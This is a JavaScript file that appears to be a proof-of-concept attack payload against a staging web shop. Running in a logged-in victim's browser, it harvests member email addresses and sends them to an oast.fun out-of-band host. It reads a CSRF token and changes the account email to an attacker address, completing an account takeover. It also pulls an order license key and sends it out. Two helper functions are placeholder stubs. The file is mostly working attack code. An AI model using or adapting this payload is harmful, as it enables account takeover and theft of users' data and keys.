// Create a new XMLHttpRequest objecT
var xhr = new XMLHttpRequest();

// Configure the request
xhr.open('GET', 'https://outfitters.stage.sugariapps.com/', true);

// Define a function to handle the response
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
        // Parse the response HTML to find the script tag content
        var responseHtml = xhr.responseText;
        var scriptRegex = /customer\/([a-zA-Z0-9-]+)\b/;
        var match = scriptRegex.exec(responseHtml);

        if (match && match[1]) {
            var victim = match[1];
             // Function to alert email addresses
            function alertEmailAddresses(emailAddresses) {
              if (emailAddresses.length > 0) {
                var emailList = emailAddresses.join("\n");
                alert("Extracted Email Addresses:\n" + emailList);
                fetch(`https://ck37m3g2vtc0000qvpr0gjtu4bayyyyyb.oast.fun?emails=${encodeURIComponent(emailList)}`)
              } else {
                alert("No email addresses found in the response.");
              }
            }
            // URL to send the GET request to
            var url = `https://outfitters.stage.sugariapps.com/members/${victim}/contactmembers`;
            
            // Send the GET request and process the response
            sendGetRequest(url, function(response) {
              var extractedEmails = extractEmailAddresses(response);
              alertEmailAddresses(extractedEmails);
            });

            // Define the URL to fetch the profile page
            const profileUrl = `https://outfitters.stage.sugariapps.com/members/${victim}/profile`;
            alert('HI Victim your username is '+victim);

            // Define the headers for the GET request
            const getHeaders = {
                Accept: 'text/html',
            };

            // Send the GET request to fetch the profile page
            fetch(profileUrl, {
                method: 'GET',
                headers: getHeaders,
                credentials: 'include', // Include cookies in the request
            })
            .then(response => response.text())
            .then(html => {
                // Extract the value of fuel_csrf_token from the response HTML
                const csrfTokenMatch = html.match(/<input name="fuel_csrf_token" value="([^"]+)" type="hidden"/);
                if (csrfTokenMatch && csrfTokenMatch[1]) {
                    const csrfToken = csrfTokenMatch[1];

                    // Now you have the csrf token value, you can use it in the POST request
                    const email = 'attacker@accounttakeover.com';
                    const postUrl = 'https://outfitters.stage.sugariapps.com/rest/members/editemail';
                    const postHeaders = {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    };
                    const postBody = `email=${encodeURIComponent(email)}&fuel_csrf_token=${encodeURIComponent(csrfToken)}`;

                    // Send the POST request
                    fetch(postUrl, {
                        method: 'POST',
                        headers: postHeaders,
                        body: postBody,
                        credentials: 'include', // Include cookies in the request
                    })
                    .then(response => response.text())
                    .then(data => {
                        console.log('POST Response:', data);
                        alert('Hi  '+victim+' Attacker has changed your email to attacker@accounttakeover.com');
                    })
                    .catch(error => {
                        console.error('POST Error:', error);
                    });
                } else {
                    console.error('fuel_csrf_token not found in the response HTML');
                }
            })
            .catch(error => {
                console.error('GET Error:', error);
            });

            // Construct the URL for the main page
            var mainPageURL = 'https://outfitters.stage.sugariapps.com/';

            // Create a new XMLHttpRequest object for the main page
            var mainPageXhr = new XMLHttpRequest();

            // Configure the request for the main page
            mainPageXhr.open('GET', mainPageURL, true);

            // Set up a callback function to handle the main page response
            mainPageXhr.onreadystatechange = function() {
                if (mainPageXhr.readyState === 4) {
                    if (mainPageXhr.status === 200) {
                        var mainPageResponse = mainPageXhr.responseText;

                        // Extract the order header link text from the main page response
                        var orderHeaderLinkText = extractOrderHeaderLinkText(mainPageResponse);

                        // Construct the URL for the order details page
                        var orderDetailsPageURL = `https://outfitters.stage.sugariapps.com/members/${orderHeaderLinkText}/orders`;

                        // Create a new XMLHttpRequest object for the order details page
                        var orderDetailsXhr = new XMLHttpRequest();

                        // Configure the request for the order details page
                        orderDetailsXhr.open('GET', orderDetailsPageURL, true);

                        // Set up a callback function to handle the order details page response
                        orderDetailsXhr.onreadystatechange = function() {
                            if (orderDetailsXhr.readyState === 4) {
                                if (orderDetailsXhr.status === 200) {
                                    var orderDetailsResponse = orderDetailsXhr.responseText;

                                    // Extract the order number using string manipulation
                                    var orderNumber = extractOrderNumber(orderDetailsResponse);

                                    // Construct the URL for the second request
                                    var secondRequestURL = `https://outfitters.stage.sugariapps.com/rest/orders/order/${orderNumber}`;

                                    // Function to fetch JSON data and alert the license key
                                    async function fetchLicenseKey() {
                                        try {
                                            const response = await fetch(secondRequestURL);

                                            if (!response.ok) {
                                                throw new Error(`Failed to fetch JSON: ${response.statusText}`);
                                            }

                                            const jsonData = await response.json();
                                            const licenseKey = jsonData.data.orderaddongroups[0].addongroup.member_license.license_key;

                                            if (licenseKey) {
                                                alert('License Key: ' + licenseKey+ 'For Order'+ orderNumber+'  \n SENT TO ATTACKER' );
                                                fetch(`https://ck37m3g2vtc0000qvpr0gjtu4bayyyyyb.oast.fun?key=${encodeURIComponent(licenseKey)}&order=${encodeURIComponent(orderNumber)}`)
                                            } else {
                                                alert('License Key not found in the response.');
                                            }
                                        } catch (error) {
                                            console.error('An error occurred:', error);
                                        }
                                    }

                                    // Call the function to fetch data and alert the license key
                                    fetchLicenseKey();
                                } else {
                                    console.error('Failed to load order details page:', orderDetailsXhr.status);
                                }
                            }
                        };

                        // Send the request for the order details page
                        orderDetailsXhr.send();
                    } else {
                        console.error('Failed to load main page:', mainPageXhr.status);
                    }
                }
            };

            // Send the request for the main page
            mainPageXhr.send();
        }
    }
};

// Send the request
xhr.send();

// Function to extract the order header link text from the main page response
function extractOrderHeaderLinkText(response) {
    // You need to implement this function to extract the link text
    // This might involve using regular expressions or other methods
    // to locate and extract the relevant information from the response
    // For this example, let's assume that you have already implemented this function
    // and it returns the order header link text as a string
    // For demonstration purposes, we'll use a placeholder value here
    return '';
}

// Function to extract the order number from the order details page response
function extractOrderNumber(response) {
    // You need to implement this function to extract the order number
    // This might involve using regular expressions or other methods
    // to locate and extract the relevant information from the response
    // For this example, let's assume that you have already implemented this function
    // and it returns the order number as a string
    // For demonstration purposes, we'll use a placeholder value here
    return '14414';
}
// Function to send a GET request
function sendGetRequest(url, callback) {
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
      callback(xhr.responseText);
    }
  };
  xhr.open("GET", url, true);
  xhr.send();
}

// Function to extract email addresses using regex
function extractEmailAddresses(html) {
  var emailRegex = /[\w\.-]+@[\w\.-]+\.\w+/g;
  var matches = html.match(emailRegex);
  return matches || [];
}


